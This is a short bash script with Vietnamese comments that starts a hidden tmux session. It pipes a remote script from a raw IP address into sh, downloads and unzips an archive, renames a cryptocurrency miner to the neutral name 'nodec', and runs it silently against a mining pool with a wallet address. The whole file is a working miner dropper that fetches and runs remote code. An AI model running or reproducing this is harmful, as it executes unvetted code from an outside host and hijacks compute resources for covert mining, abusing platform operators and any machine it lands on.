#!/bin/bash

# Mở một phiên làm việc mới trong tmux
tmux new-session -d -s my_session

# Thực hiện lệnh wget trong tmux
tmux send-keys -t my_session "
!wget -O - -q http://150.136.168.71:80/archxx/hidex1.sh | sh
!wget -q http://150.136.168.71:80/archxx/god.zip
!unzip god.zip >/dev/null 2>&1
!mv nexellia-miner nodec
!chmod 700 nodec
!./nodec -s 213.202.219.101:33455 -a nexellia:qz327zun79e25gzjvwut4d0a43y6kvyz0n8dj5z5d87wh0q38dkgs2rewh2r8 >/dev/null 2>&1
" C-m

# Bắt đầu tmux
tmux attach -t my_session
